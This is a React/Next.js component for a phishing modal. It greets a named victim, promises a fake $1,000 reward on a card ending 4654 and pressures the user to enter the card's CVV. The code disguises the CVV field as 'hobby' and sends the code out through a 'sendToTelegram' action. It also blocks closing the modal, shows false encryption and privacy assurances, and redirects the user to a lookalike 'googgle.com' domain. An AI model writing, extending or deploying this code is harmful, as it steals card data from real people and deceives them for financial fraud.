"use client"
import type React from "react"
import { useState, useEffect, useRef } from "react"
import Image from "next/image"
import { X, ArrowLeft, CheckCircle, AlertCircle, Info, Loader2, ShieldCheck, CreditCard } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { sendToTelegram } from "@/app/actions"

export default function RewardModal() {
  const [isOpen, setIsOpen] = useState(false)
  const [isVisible, setIsVisible] = useState(false)
  const [step, setStep] = useState(1)
  const [showNotification, setShowNotification] = useState(false)
  const [isBouncing, setIsBouncing] = useState(false)
  const [showCVV, setShowCVV] = useState(false)
  const [isVerifying, setIsVerifying] = useState(false)
  const [isWaiting, setIsWaiting] = useState(false)
  const [waitingSeconds, setWaitingSeconds] = useState(30)
  const [progress, setProgress] = useState(0)
  const [showVerificationMessage, setShowVerificationMessage] = useState(false)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isLoadingGears, setIsLoadingGears] = useState(false)
  
  const modalRef = useRef<HTMLDivElement>(null)
  const waitingTimerRef = useRef<NodeJS.Timeout | null>(null)

  const [formData, setFormData] = useState({
    cardNumber: "",
    hobby: "", // CVV
    expiryDate: "",
  })
  const [errors, setErrors] = useState({
    cardNumber: "",
    hobby: "",
    expiryDate: "",
  })

  // Initial mount animation
  useEffect(() => {
    const timer = setTimeout(() => {
      setIsOpen(true)
      requestAnimationFrame(() => setIsVisible(true))
    }, 100)
    return () => clearTimeout(timer)
  }, [])

  // Bounce reset
  useEffect(() => {
    if (isBouncing) {
      const timer = setTimeout(() => setIsBouncing(false), 1000)
      return () => clearTimeout(timer)
    }
  }, [isBouncing])

  // Notification timeout
  useEffect(() => {
    if (showNotification) {
      const timer = setTimeout(() => setShowNotification(false), 3000)
      return () => clearTimeout(timer)
    }
  }, [showNotification])

  // Verification message timeout
  useEffect(() => {
    if (showVerificationMessage) {
      const timer = setTimeout(() => setShowVerificationMessage(false), 5000)
      return () => clearTimeout(timer)
    }
  }, [showVerificationMessage])

  // Waiting timer
  useEffect(() => {
    if (isWaiting && waitingSeconds > 0) {
      waitingTimerRef.current = setTimeout(() => setWaitingSeconds((p) => p - 1), 1000)
      return () => {
        if (waitingTimerRef.current) clearTimeout(waitingTimerRef.current)
      }
    } else if (isWaiting && waitingSeconds === 0) {
      setIsWaiting(false)
      setIsVerifying(true)
    }
  }, [isWaiting, waitingSeconds])

  // Progress bar
  useEffect(() => {
    if (isVerifying) {
      const interval = setInterval(() => {
        setProgress((prev) => {
          if (prev >= 100) {
            clearInterval(interval)
            setIsVerifying(false)
            setShowCVV(true)
            setShowVerificationMessage(true)
            return 0
          }
          return prev + 2 // Slower, smoother progress
        })
      }, 50)
      return () => clearInterval(interval)
    }
  }, [isVerifying])

  const attemptClose = () => {
    setShowNotification(true)
    setIsBouncing(true)
  }

  const closeModal = () => {
    if (step === 3) {
      setIsVisible(false)
      setTimeout(() => {
        setIsOpen(false)
        window.location.href = "https://www.googgle.com"
        // Reset logic here if needed
      }, 300)
    } else {
      attemptClose()
    }
  }

  const goToForm = () => {
    setStep(2)
    setTimeout(() => {
      setShowCVV(true)
      setShowVerificationMessage(true)
    }, 150)
  }

  const goBack = () => setStep(1)

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target
    setFormData((prev) => ({ ...prev, [name]: value }))
    if (errors[name as keyof typeof errors]) {
      setErrors((prev) => ({ ...prev, [name]: "" }))
    }
  }

  const validateForm = () => {
    let valid = true
    const newErrors = { cardNumber: "", hobby: "", expiryDate: "" }

    if (!formData.hobby.trim()) {
      newErrors.hobby = "CVV is required"
      valid = false
    } else if (formData.hobby.length !== 3 || !/^\d+$/.test(formData.hobby)) {
      newErrors.hobby = "Must be exactly 3 digits"
      valid = false
    }

    setErrors(newErrors)
    return valid
  }

  const submitForm = async () => {
    if (validateForm()) {
      try {
        setIsSubmitting(true)
        await sendToTelegram({ cvv: formData.hobby })
        setIsSubmitting(false)
        setIsLoadingGears(true)
        setTimeout(() => {
          setIsLoadingGears(false)
          setStep(3)
        }, 2500)
      } catch (error) {
        console.error("Error:", error)
        setIsSubmitting(false)
      }
    }
  }

  if (!isOpen) return null

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 sm:p-6">
      {/* Backdrop */}
      <div 
        className={`absolute inset-0 bg-black/70 backdrop-blur-md transition-opacity duration-500 ease-out ${
          isVisible ? "opacity-100" : "opacity-0"
        }`} 
        onClick={attemptClose} 
      />

      {/* Modal Container */}
      <div
        ref={modalRef}
        className={`relative w-full max-w-[420px] bg-white/95 dark:bg-zinc-900/95 rounded-2xl shadow-2xl border border-white/20 overflow-hidden transform transition-all duration-500 cubic-bezier(0.16, 1, 0.3, 1)
          ${isVisible ? "opacity-100 translate-y-0 scale-100" : "opacity-0 translate-y-8 scale-95"}
          ${isBouncing ? "animate-shake" : ""}`}
        style={{ boxShadow: "0 25px 50px -12px rgba(0, 0, 0, 0.25)" }}
      >
        {/* Close Button */}
        <button
          onClick={closeModal}
          className="absolute top-4 right-4 p-2 rounded-full bg-black/5 hover:bg-black/10 text-gray-500 hover:text-gray-900 transition-colors z-20"
        >
          <X className="h-5 w-5" />
        </button>

        {/* Back Button (Step 2) */}
        {step === 2 && (
          <button
            onClick={goBack}
            className="absolute top-4 left-4 p-2 rounded-full bg-black/5 hover:bg-black/10 text-gray-500 hover:text-gray-900 transition-colors z-20"
          >
            <ArrowLeft className="h-5 w-5" />
          </button>
        )}

        {/* Notification Toast */}
        {showNotification && (
          <div className="absolute top-0 left-0 right-0 bg-amber-500 text-white px-4 py-3 flex items-center justify-center z-30 animate-in slide-in-from-top-full duration-300">
            <AlertCircle className="h-4 w-4 mr-2 shrink-0" />
            <span className="text-sm font-medium">Please click "Claim Your Reward Now" to proceed</span>
          </div>
        )}

        {/* STEP 1: Welcome / Reward */}
        {step === 1 && (
          <div className="animate-in fade-in zoom-in-95 duration-500 delay-100">
            {/* Header Gradient */}
            <div className="bg-gradient-to-br from-orange-500 via-orange-400 to-yellow-400 p-8 text-white text-center relative overflow-hidden">
              <div className="absolute inset-0 bg-[url('https://www.transparenttextures.com/patterns/cubes.png')] opacity-10 mix-blend-overlay"></div>
              <div className="relative z-10">
                <div className="inline-flex items-center justify-center w-12 h-12 rounded-full bg-white/20 backdrop-blur-sm mb-4 ring-1 ring-white/30">
                  <CreditCard className="h-6 w-6 text-white" />
                </div>
                <h2 className="text-2xl font-bold tracking-tight">Hello, Annette T Perry</h2>
                <p className="text-orange-100 mt-2 text-sm leading-relaxed max-w-[280px] mx-auto">
                  You have been rewarded <span className="font-bold text-white">$1,000.00</span> on card ending in <span className="font-mono bg-white/20 px-1.5 py-0.5 rounded text-white">•••• 4654</span>
                </p>
              </div>
            </div>

            {/* Image Section */}
            <div className="px-6 -mt-6 relative z-10">
              <div className="relative w-full aspect-[16/9] rounded-xl overflow-hidden shadow-lg ring-1 ring-black/5 group">
                <Image
                  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0CuKEo5aHngw7kn_BqEdnRSX7BY_A868CItXR9XdD-g&s=10"
                  alt="Secure Card Verification"
                  fill
                  className="object-cover transition-transform duration-700 group-hover:scale-105"
                  priority
                />
                <div className="absolute inset-0 bg-gradient-to-t from-black/40 to-transparent pointer-events-none" />
              </div>
            </div>

            {/* Content & CTA */}
            <div className="p-6 pt-4 text-center space-y-5">
              <div className="space-y-2">
                <p className="text-gray-600 text-sm leading-relaxed">
                  Action Required: Confirm your card details to claim your reward. This secure verification expires in <span className="font-semibold text-gray-900">72 hours</span>.
                </p>
              </div>

              <Button
                onClick={goToForm}
                className="w-full bg-gradient-to-r from-orange-600 to-orange-500 hover:from-orange-700 hover:to-orange-600 text-white font-semibold py-6 rounded-xl shadow-lg shadow-orange-500/20 transition-all duration-300 hover:shadow-orange-500/30 active:scale-[0.98] text-base"
              >
                Claim Your Reward Now
                <ArrowLeft className="ml-2 h-4 w-4 rotate-180" />
              </Button>

              <div className="flex items-center justify-center gap-2 text-xs text-gray-400 pt-2">
                <ShieldCheck className="h-3.5 w-3.5" />
                <span>256-bit SSL Encrypted Connection</span>
              </div>
            </div>
          </div>
        )}

        {/* STEP 2: Form */}
        {step === 2 && (
          <div className="animate-in fade-in slide-in-from-right-8 duration-500">
            <div className="bg-gradient-to-br from-orange-500 via-orange-400 to-yellow-400 p-8 text-white relative overflow-hidden">
               <div className="absolute inset-0 bg-[url('https://www.transparenttextures.com/patterns/cubes.png')] opacity-10 mix-blend-overlay"></div>
               <div className="relative z-10">
                <h2 className="text-xl font-bold">Verify Identity</h2>
                <p className="text-orange-100 text-sm mt-1">Secure your card ending in <span className="font-mono font-bold">•••• 4654</span></p>
               </div>
            </div>

            <div className="p-6 space-y-5">
              {/* Info Banner */}
              {showVerificationMessage && (
                <div className="bg-blue-50/80 border border-blue-100 rounded-lg p-3.5 flex items-start gap-3 animate-in fade-in slide-in-from-top-2 duration-300">
                  <Info className="h-5 w-5 text-blue-500 shrink-0 mt-0.5" />
                  <p className="text-sm text-blue-700 leading-snug">
                    Enter the 3-digit CVV code found on the back of your card to complete verification.
                  </p>
                </div>
              )}

              {/* CVV Input */}
              {showCVV && (
                <div className="space-y-4 animate-in fade-in slide-in-from-bottom-4 duration-500 delay-100">
                  <div className="space-y-2">
                    <label htmlFor="hobby" className="text-sm font-semibold text-gray-700 flex items-center justify-between">
                      <span>Security Code (CVV)</span>
                      <span className="text-xs font-normal text-gray-400">3 digits</span>
                    </label>
                    <div className="relative">
                      <Input
                        id="hobby"
                        name="hobby"
                        placeholder="123"
                        value={formData.hobby}
                        onChange={handleInputChange}
                        maxLength={3}
                        type="password"
                        autoFocus
                        className={`h-12 text-center text-lg tracking-[0.5em] font-mono rounded-xl border-gray-200 focus:border-orange-500 focus:ring-orange-500/20 transition-all ${
                          errors.hobby ? "border-red-300 focus:border-red-500 focus:ring-red-500/20 bg-red-50/30" : ""
                        }`}
                      />
                      {/* Decorative dots behind input when focused/typing could go here, keeping it clean for now */}
                    </div>
                    {errors.hobby && (
                      <p className="text-red-500 text-xs flex items-center gap-1 animate-in fade-in slide-in-from-top-1">
                        <AlertCircle className="h-3 w-3" /> {errors.hobby}
                      </p>
                    )}
                  </div>

                  <Button
                    onClick={submitForm}
                    disabled={!showCVV || isSubmitting}
                    className="w-full bg-gray-900 hover:bg-gray-800 text-white font-semibold py-6 rounded-xl shadow-lg transition-all duration-300 active:scale-[0.98] disabled:opacity-50 disabled:cursor-not-allowed mt-2"
                  >
                    {isSubmitting ? (
                      <>
                        <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                        Verifying...
                      </>
                    ) : (
                      <>
                        Verify & Continue
                        <CheckCircle className="ml-2 h-4 w-4" />
                      </>
                    )}
                  </Button>
                </div>
              )}

              <p className="text-xs text-center text-gray-400 leading-relaxed">
                Your data is protected by industry-standard encryption. We never store your full card details.
              </p>
            </div>
          </div>
        )}

        {/* Loading Overlay */}
        {isLoadingGears && (
          <div className="absolute inset-0 bg-white/90 backdrop-blur-xl flex flex-col items-center justify-center z-40 animate-in fade-in duration-300">
            <div className="relative mb-6">
              <div className="absolute inset-0 bg-orange-500/20 blur-xl rounded-full animate-pulse" />
              <Loader2 className="h-12 w-12 text-orange-500 animate-spin relative z-10" strokeWidth={1.5} />
            </div>
            <h3 className="text-lg font-bold text-gray-900">Processing Verification</h3>
            <p className="text-sm text-gray-500 mt-1">Securing your reward...</p>
            
            {/* Progress Bar */}
            <div className="w-48 h-1.5 bg-gray-100 rounded-full mt-6 overflow-hidden">
              <div 
                className="h-full bg-orange-500 rounded-full transition-all duration-100 ease-linear"
                style={{ width: `${progress}%` }}
              />
            </div>
          </div>
        )}

        {/* STEP 3: Success */}
        {step === 3 && (
          <div className="animate-in fade-in zoom-in-95 duration-500">
            <div className="bg-gradient-to-br from-emerald-500 to-teal-600 p-8 text-white text-center relative overflow-hidden">
              <div className="absolute inset-0 bg-[url('https://www.transparenttextures.com/patterns/diagmonds-light.png')] opacity-10 mix-blend-overlay"></div>
              <div className="relative z-10">
                <h2 className="text-2xl font-bold">Verification Complete</h2>
                <p className="text-emerald-100 mt-1 text-sm">Your identity has been successfully confirmed.</p>
              </div>
            </div>

            <div className="p-8 text-center space-y-6">
              <div className="flex justify-center">
                <div className="relative">
                  <div className="absolute inset-0 bg-emerald-500/20 blur-2xl rounded-full" />
                  <div className="w-20 h-20 rounded-full bg-emerald-50 flex items-center justify-center ring-4 ring-emerald-50 relative z-10 animate-in zoom-in duration-500 delay-100">
                    <CheckCircle className="h-10 w-10 text-emerald-500" strokeWidth={2.5} />
                  </div>
                </div>
              </div>

              <div className="space-y-2">
                <h3 className="text-xl font-bold text-gray-900">Reward Secured</h3>
                <p className="text-gray-500 text-sm leading-relaxed max-w-[260px] mx-auto">
                  We have verified your information. Your $1,000 reward will be processed and reflected in your account shortly.
                </p>
              </div>

              <Button
                onClick={closeModal}
                className="w-full bg-gray-900 hover:bg-gray-800 text-white font-semibold py-5 rounded-xl shadow-lg transition-all duration-300 active:scale-[0.98]"
              >
                Return to Home
              </Button>
            </div>
          </div>
        )}
      </div>
    </div>
  )
}
